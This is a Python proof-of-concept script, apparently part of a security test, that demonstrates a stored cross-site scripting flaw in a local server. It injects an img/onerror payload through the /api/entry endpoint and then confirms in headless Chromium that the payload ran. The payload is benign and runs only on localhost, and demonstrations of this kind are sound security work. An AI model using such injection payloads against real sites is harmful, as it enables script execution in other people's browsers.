#!/usr/bin/env python3
"""xss_proof.py - REAL browser proof of the stored XSS in server.py.
1) boots the BAHI handler on an ephemeral port
2) injects the payload as an event `type` via /api/entry
3) loads the page in headless Chromium (auto-runs refresh() -> innerHTML sink)
4) greps the serialized DOM for the marker left by the onerror handler

Usage: python3 attack/xss_proof.py [chromium-binary]
Exit 0 = XSS executed in a real browser (marker found).
"""
import http.client, json, os, subprocess, sys, threading, time, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from http.server import HTTPServer
import server as srv

MARKER = "data-xss=\"PWNED\""
PAYLOAD = "<img src=x onerror=\"document.body.setAttribute('data-xss','PWNED')\">"

def main():
    srv.rebuild()
    httpd = HTTPServer(("127.0.0.1", 0), srv.Handler)
    port = httpd.server_address[1]
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.2)

    # inject
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    conn.request("GET", "/api/entry?type=" + urllib.parse.quote(PAYLOAD) + "&paise=100")
    r = conn.getresponse(); r.read(); conn.close()
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    conn.request("GET", "/api/state")
    r = conn.getresponse(); state = json.loads(r.read()); conn.close()
    stored = state["events"][-1]["type"]
    print("payload stored verbatim:", PAYLOAD in stored)

    cands = [
        sys.argv[1] if len(sys.argv) > 1 else None,
        os.path.expanduser("~/.cache/ms-playwright/chromium-1234/chrome-linux64/chrome"),
        os.path.expanduser("~/.cache/ms-playwright/chromium_headless_shell-1234/chrome-headless-shell-linux64/chrome-headless-shell"),
    ]
    chrome = next((c for c in cands if c and os.path.exists(c)), None)
    if not chrome:
        print("no chromium found; static proof only (payload stored, sink unescaped)")
        httpd.shutdown()
        return 0 if stored else 1

    url = "http://127.0.0.1:%d/" % port
    cmd = [chrome, "--headless=new", "--no-sandbox", "--disable-gpu",
           "--virtual-time-budget=8000", "--dump-dom", url]
    dom = subprocess.run(cmd, capture_output=True, timeout=60)
    text = dom.stdout.decode("utf-8", "replace")
    found = MARKER in text
    print("XSS marker in rendered DOM:", found)
    if found:
        i = text.find(MARKER)
        print("...", text[max(0, i - 120):i + 40].replace("\n", " "), "...")
    httpd.shutdown()
    return 0 if found else 1

if __name__ == "__main__":
    sys.exit(main())